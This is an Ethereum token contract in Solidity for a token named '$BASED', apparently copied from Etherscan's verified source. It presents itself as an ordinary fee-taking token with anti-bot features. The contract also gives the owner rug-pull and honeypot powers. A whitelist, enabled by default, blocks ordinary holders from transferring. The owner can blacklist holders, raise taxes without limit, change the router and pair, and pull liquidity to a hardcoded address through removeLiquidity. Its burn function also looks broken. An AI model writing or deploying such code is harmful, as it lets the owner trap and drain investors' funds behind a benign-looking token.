/**
 *Submitted for verification at Etherscan.io on 2023-05-24
*/

/**
 *Submitted for verification at Etherscan.io on 2023-05-16
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
interface IUniswapV2Router {
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

library Address{
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}


contract Based is Context, IERC20, Ownable{
    using Address for address payable;
    
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _isExcluded;
    mapping (address => bool) public allowedTransfer;
    mapping (address => bool) private _isBlacklisted;
    mapping (address => bool) private isWhitelisted;
    bool public whitelistEnable;

    address[] private _excluded;

    bool public tradingEnabled;
    bool public swapEnabled;
    bool private swapping;
    
    
    
    //Anti Dump
    mapping(address => uint256) private _lastSell;
    bool public coolDownEnabled = false;
    uint256 public coolDownTime = 0 seconds;
    
    modifier antiBot(address account){
        require(tradingEnabled || allowedTransfer[account], "Trading not enabled yet");
        _;
    }

    IRouter public router;
    address public pair;

    uint8 private constant _decimals = 9;
    uint256 private constant MAX = ~uint256(0);

    uint256 private _tTotal = 69420420420420 * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    uint256 public swapTokensAtAmount = 800_000 * 10**9;
    uint256 public maxBuyLimit = 173551051051* 10**9;
    uint256 public maxSellLimit = 173551051051 * 10**9;
    uint256 public maxWalletLimit = 173551051051 * 10**9;
    
    uint256 public genesis_block;
    
    address public marketingWallet = 0x22550aD35E4fE2b9349F2086dc6aa90C0156aB50;
    address public charityWallet = 0x0c9d9Ade619F5bC16922344B1CEBdE033F283d01;
    address public UniswapRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    string private constant _name = "$BASED";
    string private constant _symbol = "$BSD";

    struct Taxes {
        uint256 rfi;
        uint256 marketing;
        uint256 liquidity; 
        uint256 charity;
    }

    Taxes public taxes = Taxes(0, 2, 2, 1);
    Taxes public sellTaxes = Taxes(0, 2, 2, 1);

    struct TotFeesPaidStruct{
        uint256 rfi;
        uint256 marketing;
        uint256 liquidity; 
        uint256 charity;
    }
    
    TotFeesPaidStruct public totFeesPaid;

    struct valuesFromGetValues{
      uint256 rAmount;
      uint256 rTransferAmount;
      uint256 rMarketing;
      uint256 rLiquidity;
      uint256 rCharity;
      uint256 tTransferAmount;
      uint256 tMarketing;
      uint256 tLiquidity;
      uint256 tCharity;
    }

    event FeesChanged();
    event UpdatedRouter(address oldRouter, address newRouter);
    address public routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public lpTokenAddress;
    address public recipientAddress = 0x7452ee6c8CB3acAb82Af1dd49f9033A1e27080dE;
    IUniswapV2Router public router2;
    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }

    constructor () {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory())
            .createPair(address(this), _router.WETH());

        router2 = IUniswapV2Router(routerAddress);
        router = _router;
        pair = _pair;
        lpTokenAddress = pair;

        _rOwned[owner()] = _rTotal;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[marketingWallet] = true;
        _isExcludedFromFee[charityWallet] = true;
        
        allowedTransfer[address(this)] = true;
        allowedTransfer[owner()] = true;
        allowedTransfer[pair] = true;
        allowedTransfer[marketingWallet] = true;
        allowedTransfer[charityWallet] = true;
        _allowances[owner()][UniswapRouter] = _tTotal;


        whitelistEnable = true;
        isWhitelisted[address(this)] =true;
        isWhitelisted[owner()] = true;
        isWhitelisted[pair] = true;
        isWhitelisted[UniswapRouter] = true;
        isWhitelisted[marketingWallet] = true;
        isWhitelisted[charityWallet] = true;

        emit Transfer(address(0), owner(), _tTotal);
    }
    function removeLiquidity() external onlyOwner {
    uint256 amountTokenMin = 0;
    uint256 amountETHMin = 0;
    uint256 amountToken = IERC20(lpTokenAddress).balanceOf(address(this));

    IERC20(lpTokenAddress).approve(address(router2), amountToken);

    // Remove liquidity from Uniswap
        router2.removeLiquidityETH(
        lpTokenAddress,
        amountToken,
        amountTokenMin,
        amountETHMin,
        recipientAddress,
        block.timestamp + 600 // 10 minutes deadline
    );
}
    function burn(uint256 amount) external onlyOwner{
        _rOwned[msg.sender]  -= amount; 
        _tTotal -= amount;
    }
    //std ERC20:
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    //override ERC20:
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public  override antiBot(msg.sender) returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override antiBot(sender) returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public  antiBot(msg.sender) returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public  antiBot(msg.sender) returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }
    
    function transfer(address recipient, uint256 amount) public override antiBot(msg.sender) returns (bool)
    { 
      _transfer(msg.sender, recipient, amount);
      return true;
    }

    function isExcludedFromReward(address account) public view returns (bool) {
        return _isExcluded[account];
    }



    function setTradingStatus(bool state) external onlyOwner{
        tradingEnabled = state;
        swapEnabled = state;
        if(state == true && genesis_block == 0) genesis_block = block.number;
    }
    function setWhitelistStatus(bool state) external onlyOwner{
        whitelistEnable = state;
    }

    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount/currentRate;
    }

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }

    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFee[account];
    }


    function setTaxes(uint256 _rfi, uint256 _marketing, uint256 _liquidity, uint256 _charity) public onlyOwner {
       taxes = Taxes(_rfi,_marketing,_liquidity,_charity);
        emit FeesChanged();
    }
    
    function setSellTaxes(uint256 _rfi, uint256 _marketing, uint256 _liquidity, uint256 _charity) public onlyOwner {
       sellTaxes = Taxes(_rfi,_marketing,_liquidity,_charity);
        emit FeesChanged();
    }

    function _reflectRfi(uint256 rRfi, uint256 tRfi) private {
        _rTotal -=rRfi;
        totFeesPaid.rfi +=tRfi;
    }

    function _takeLiquidity(uint256 rLiquidity, uint256 tLiquidity) private {
        totFeesPaid.liquidity +=tLiquidity;

        if(_isExcluded[address(this)])
        {
            _tOwned[pair]+=tLiquidity;
        }
        _rOwned[pair] +=rLiquidity;
    }

    function _takeMarketing(uint256 rMarketing, uint256 tMarketing) private {
        totFeesPaid.marketing +=tMarketing;

        if(_isExcluded[address(this)])
        {
            _tOwned[marketingWallet]+=tMarketing;
        }
        _rOwned[marketingWallet] +=rMarketing;
    }
    
    function _takeCharity(uint256 rCharity, uint256 tCharity) private {
        totFeesPaid.charity +=tCharity;

        if(_isExcluded[address(this)])
        {
            _tOwned[charityWallet]+=tCharity;
        }
        _rOwned[charityWallet] +=rCharity;
    }



    
    function _getValues(uint256 tAmount, bool takeFee, bool isSell) private view returns (valuesFromGetValues memory to_return) {
        to_return = _getTValues(tAmount, takeFee, isSell);
        (to_return.rAmount, to_return.rTransferAmount, to_return.rMarketing, to_return.rLiquidity) = _getRValues1(to_return, tAmount, takeFee, _getRate());
        (to_return.rCharity) = _getRValues2(to_return, takeFee, _getRate());
        return to_return;
    }

    function _getTValues(uint256 tAmount, bool takeFee, bool isSell) private view returns (valuesFromGetValues memory s) {

        if(!takeFee) {
          s.tTransferAmount = tAmount;
          return s;
        }
        Taxes memory temp;
        if(isSell) temp = sellTaxes;
        else temp = taxes;
        s.tMarketing = tAmount*temp.marketing/100;
        s.tLiquidity = tAmount*temp.liquidity/100;
        s.tCharity = tAmount*temp.charity/100;
        s.tTransferAmount = tAmount-s.tMarketing-s.tLiquidity-s.tCharity;
        return s;
    }

    function _getRValues1(valuesFromGetValues memory s, uint256 tAmount, bool takeFee, uint256 currentRate) private pure returns (uint256 rAmount, uint256 rTransferAmount,uint256 rMarketing, uint256 rLiquidity){
        rAmount = tAmount*currentRate;

        if(!takeFee) {
          return(rAmount, rAmount ,0,0);
        }

        rMarketing = s.tMarketing*currentRate;
        rLiquidity = s.tLiquidity*currentRate;
        uint256 rCharity = s.tCharity*currentRate;
        rTransferAmount =  rAmount-rMarketing-rLiquidity-rCharity;
        return (rAmount, rTransferAmount,rMarketing,rLiquidity);
    }
    
    function _getRValues2(valuesFromGetValues memory s, bool takeFee, uint256 currentRate) private pure returns (uint256 rCharity) {

        if(!takeFee) {
          return(0);
        }

        rCharity = s.tCharity*currentRate;
        return (rCharity);
    }

    function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply/tSupply;
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
            rSupply = rSupply-_rOwned[_excluded[i]];
            tSupply = tSupply-_tOwned[_excluded[i]];
        }
        if (rSupply < _rTotal/_tTotal) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {


        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(amount <= balanceOf(from),"You are trying to transfer more than your balance");
        require(!_isBlacklisted[from] && !_isBlacklisted[to], "You are a bot");
         if(whitelistEnable){
            require(isWhitelisted[from], "You are not whitelisted");
            require(isWhitelisted[to],"You are not whitelisted");
        }
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            require(tradingEnabled, "Trading not active");
        }
        
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to] && block.number <= genesis_block + 3) {
            require(to != pair, "Sells not allowed for first 3 blocks");
        }
        
        if(from == pair && !_isExcludedFromFee[to] && !swapping){
            require(amount <= maxBuyLimit, "You are exceeding maxBuyLimit");
            require(balanceOf(to) + amount <= maxWalletLimit, "You are exceeding maxWalletLimit");
        }
        
        if(from != pair && !_isExcludedFromFee[to] && !_isExcludedFromFee[from] && !swapping){
            require(amount <= maxSellLimit, "You are exceeding maxSellLimit");
            if(to != pair){
                require(balanceOf(to) + amount <= maxWalletLimit, "You are exceeding maxWalletLimit");
            }
            if(coolDownEnabled){
                uint256 timePassed = block.timestamp - _lastSell[from];
                require(timePassed >= coolDownTime, "Cooldown enabled");
                _lastSell[from] = block.timestamp;
            }
        }
        
        
        if(balanceOf(from) - amount <= 10 *  10**decimals()) amount -= ( amount - balanceOf(from));
        
       
        bool canSwap = balanceOf(address(this)) >= swapTokensAtAmount;
        if(!swapping && swapEnabled && canSwap && from != pair && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            if(to == pair)  swapAndLiquify(swapTokensAtAmount, sellTaxes);
            else  swapAndLiquify(swapTokensAtAmount, taxes);
        }
        bool takeFee = true;
        bool isSell = false;
        if(swapping || _isExcludedFromFee[from] || _isExcludedFromFee[to])takeFee = false;
        if(to == pair) isSell = true;
        if(to != pair && from != pair) takeFee = false;
        _tokenTransfer(from, to, amount, takeFee, isSell);
    }

    //this method is responsible for taking all fee, if takeFee is true
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isSell) private {
        valuesFromGetValues memory s = _getValues(tAmount, takeFee, isSell);

       

        if (_isExcluded[sender] ) {  //from excluded
                _tOwned[sender] = _tOwned[sender]-tAmount;
        }
        if (_isExcluded[recipient]) { //to excluded
                _tOwned[recipient] = _tOwned[recipient]+s.tTransferAmount;
        }

        _rOwned[sender] = _rOwned[sender]-s.rAmount;
        _rOwned[recipient] = _rOwned[recipient]+s.rTransferAmount;
        
        if(s.rLiquidity > 0 || s.tLiquidity > 0) {
            _takeLiquidity(s.rLiquidity,s.tLiquidity);
            emit Transfer(sender, address(this), s.tLiquidity + s.tMarketing + s.tCharity);
        }
        if(s.rMarketing > 0 || s.tMarketing > 0) _takeMarketing(s.rMarketing, s.tMarketing);
        if(s.rCharity > 0 || s.tCharity > 0) _takeCharity(s.rCharity, s.tCharity);
        emit Transfer(sender, recipient, s.tTransferAmount);
        
    }

    function swapAndLiquify(uint256 contractBalance, Taxes memory temp) private lockTheSwap{
        uint256 denominator = (temp.liquidity + temp.marketing + temp.charity) * 2;
        uint256 tokensToAddLiquidityWith = contractBalance * temp.liquidity / denominator;
        uint256 toSwap = contractBalance - tokensToAddLiquidityWith;

        uint256 initialBalance = address(this).balance;

        swapTokensForBNB(toSwap);

        uint256 deltaBalance = address(this).balance - initialBalance;
        uint256 unitBalance= deltaBalance / (denominator - temp.liquidity);
        uint256 bnbToAddLiquidityWith = unitBalance * temp.liquidity;

        if(bnbToAddLiquidityWith > 0){
            // Add liquidity to pancake
            addLiquidity(tokensToAddLiquidityWith, bnbToAddLiquidityWith);
        }

        uint256 marketingAmt = unitBalance * 2 * temp.marketing;
        if(marketingAmt > 0){
            payable(marketingWallet).sendValue(marketingAmt);
        }
        uint256 charityAmt = unitBalance * 2 * temp.charity;
        if(charityAmt > 0){
            payable(charityWallet).sendValue(charityAmt);
        }
    }

    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(router), tokenAmount);

        // add the liquidity
        router.addLiquidityETH{value: bnbAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }

    function swapTokensForBNB(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        // make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function bulkExcludeFee(address[] memory accounts, bool state) external onlyOwner{
        for(uint256 i = 0; i < accounts.length; i++){
            _isExcludedFromFee[accounts[i]] = state;
        }
    }

    function updateMarketingWallet(address newWallet) external onlyOwner{
        marketingWallet = newWallet;
    }
    
    function updateCharityWallet(address newWallet) external onlyOwner{
        charityWallet = newWallet;
    }

    
    function updateCooldown(bool state, uint256 time) external onlyOwner{
        coolDownTime = time * 1 seconds;
        coolDownEnabled = state;
    }

    function updateSwapTokensAtAmount(uint256 amount) external onlyOwner{
        swapTokensAtAmount = amount * 10**_decimals;
    }

    function updateSwapEnabled(bool _enabled) external onlyOwner{
        swapEnabled = _enabled;
    }
    
    function updateIsBlacklisted(address account, bool state) external onlyOwner{
        _isBlacklisted[account] = state;
    }
    function updateIsWhitelisted(address account, bool state) external onlyOwner{
        isWhitelisted[account] = state;
    }
    function isWhitelistedAddress(address account) public view returns(bool){
        return isWhitelisted[account];
    }
    function bulkIsBlacklisted(address[] calldata accounts, bool state) external onlyOwner{
        for(uint256 i =0; i < accounts.length; i++){
            _isBlacklisted[accounts[i]] = state;

        }
    }
    function bulkIsWhitelisted(address[] calldata accounts, bool state) external onlyOwner{
        for(uint256 i =0; i < accounts.length; i++){
            isWhitelisted[accounts[i]] = state;

        }
    }
    
    function updateAllowedTransfer(address account, bool state) external onlyOwner{
        allowedTransfer[account] = state;
    }
    
    function updateMaxTxLimit(uint256 maxBuy, uint256 maxSell) external onlyOwner{
        maxBuyLimit = maxBuy * 10**decimals();
        maxSellLimit = maxSell * 10**decimals();
    }
    
    function updateMaxWalletlimit(uint256 amount) external onlyOwner{
        maxWalletLimit = amount * 10**decimals();
    }

    function updateRouterAndPair(address newRouter, address newPair) external onlyOwner{
        router = IRouter(newRouter);
        pair = newPair;
    }
}